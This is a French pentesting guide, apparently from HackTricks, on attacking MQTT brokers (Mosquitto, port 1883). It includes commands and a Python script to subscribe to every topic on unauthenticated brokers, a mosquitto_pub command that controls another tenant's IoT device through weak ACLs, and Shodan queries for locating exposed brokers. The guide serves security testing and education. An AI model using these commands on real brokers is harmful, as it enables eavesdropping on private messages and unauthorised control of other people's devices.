# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Informations de base

**MQ Telemetry Transport (MQTT)** est connu comme un **protocole de messagerie publication/abonnement** qui se distingue par son extrême simplicité et sa légèreté. Ce protocole est spécifiquement conçu pour des environnements où les appareils ont des capacités limitées et fonctionnent sur des réseaux caractérisés par une faible bande passante, une latence élevée ou des connexions peu fiables. Les objectifs principaux de MQTT incluent la minimisation de l'utilisation de la bande passante réseau et la réduction de la demande en ressources des appareils. De plus, il vise à maintenir une communication fiable et à fournir un certain niveau de garantie de livraison. Ces objectifs rendent MQTT particulièrement adapté au domaine en plein essor de la **communication machine-à-machine (M2M)** et de l'**Internet des objets (IoT)**, où il est essentiel de connecter efficacement une multitude d'appareils. En outre, MQTT est très utile pour les applications mobiles, où la conservation de la bande passante et de la batterie est cruciale.

**Port par défaut :** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Inspection du trafic

Lorsqu'un paquet **CONNECT** est reçu par les MQTT brokers, un paquet **CONNACK** est renvoyé. Ce paquet contient un code de retour qui est crucial pour comprendre l'état de la connexion. Un code de retour **0x00** signifie que les identifiants ont été acceptés, indiquant une connexion réussie. En revanche, un code de retour **0x05** indique que les identifiants sont invalides, empêchant ainsi la connexion.

Par exemple, si le broker rejette la connexion en raison d'identifiants invalides, le scénario ressemblerait à ceci :
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**L'authentification est totalement optionnelle** et même si une authentification est effectuée, **le chiffrement n'est pas utilisé par défaut** (les identifiants sont envoyés en clair). Des attaques MITM peuvent toujours être exécutées pour voler les mots de passe.

Pour se connecter à un service MQTT, vous pouvez utiliser : [https://github.com/bapowell/python-mqtt-client-shell] et vous abonner à tous les topics en faisant :
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Vous pouvez également utiliser [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Vous pouvez également utiliser :
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Ou vous pouvez **exécuter ce code pour essayer de vous connecter à un service MQTT sans authentification, vous abonner à tous les topics et les écouter** :
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### Le modèle Publish/Subscribe <a href="#b667" id="b667"></a>

Le modèle publish/subscribe est composé de :

- **Publisher** : publie un message vers un ou plusieurs topic(s) sur le broker.
- **Subscriber** : s'abonne à un ou plusieurs topic(s) sur le broker et reçoit tous les messages envoyés par le publisher.
- **Broker** : achemine tous les messages des publishers vers les subscribers.
- **Topic** : consiste en un ou plusieurs niveaux séparés par un slash (p.ex. /smartshouse/livingroom/temperature).

### Format du paquet <a href="#f15a" id="f15a"></a>

Chaque paquet MQTT contient un en-tête fixe (Figure 02).Figure 02 : Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Types de paquets

- CONNECT (1) : Initié par le client pour demander une connexion au serveur.
- CONNACK (2) : Accusé de réception par le serveur d'une connexion réussie.
- PUBLISH (3) : Utilisé pour envoyer un message du client vers le serveur ou inversement.
- PUBACK (4) : Accusé de réception d'un paquet PUBLISH.
- PUBREC (5) : Partie du protocole de livraison garantissant que le message est reçu.
- PUBREL (6) : Garantie supplémentaire dans la livraison des messages, indiquant la libération du message.
- PUBCOMP (7) : Dernière étape du protocole de livraison de message, indiquant l'achèvement.
- SUBSCRIBE (8) : Requête d'un client pour écouter les messages d'un topic.
- SUBACK (9) : Accusé de réception par le serveur d'une requête SUBSCRIBE.
- UNSUBSCRIBE (10) : Requête d'un client pour cesser de recevoir les messages d'un topic.
- UNSUBACK (11) : Réponse du serveur à une requête UNSUBSCRIBE.
- PINGREQ (12) : Message de heartbeat envoyé par le client.
- PINGRESP (13) : Réponse du serveur au message de heartbeat.
- DISCONNECT (14) : Initié par le client pour terminer la connexion.
- Deux valeurs, 0 et 15, sont marquées comme réservées et leur utilisation est interdite.

## Attaques de l'écosystème IoT MQTT : brokers en clair et contournement des ACL de topics

De nombreuses plateformes IoT grand public exposent des brokers MQTT utilisés par deux rôles distincts :
- Gateway/hub devices qui font le pont entre des protocoles radio (p.ex. BLE/LoRa/Zigbee) et le cloud.
- Applications mobiles ou backends web qui contrôlent les devices via des topics "app".

Faiblesses courantes que vous pouvez exploiter lors d'un pentest :

- MQTT en clair sur des ports non standards (p.ex. TCP/8001) au lieu de MQTTS. Tout observateur on-path peut lire les identifiants et les trames de contrôle. Utilisez Wireshark pour repérer du trafic en clair CONNECT/CONNACK et SUBSCRIBE/PUBLISH sur des ports inhabituels.
- ACLs de topic par locataire faibles ou absentes. Si les topics sont namespacés uniquement par deviceId (p.ex. "/tenantless/<deviceId>/tx"), tout utilisateur authentifié pourrait PUBLISHer vers les devices d'autres tenants.
- Fuite de données sensibles via des topics de maintenance/admin (p.ex. identifiants Wi‑Fi diffusés en clair après des modifications de configuration).

Exemples (remplacez les placeholders par des valeurs réelles) :

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Contrôle cross-tenant lorsque les ACLs sont faibles (publish to another tenant’s device topic):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- Le MQTT en clair sur des ports non standard est courant dans l'IoT. Pensez à rechercher des brokers sur des ports alternatifs et à confirmer avec la détection du protocole.

## Références

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
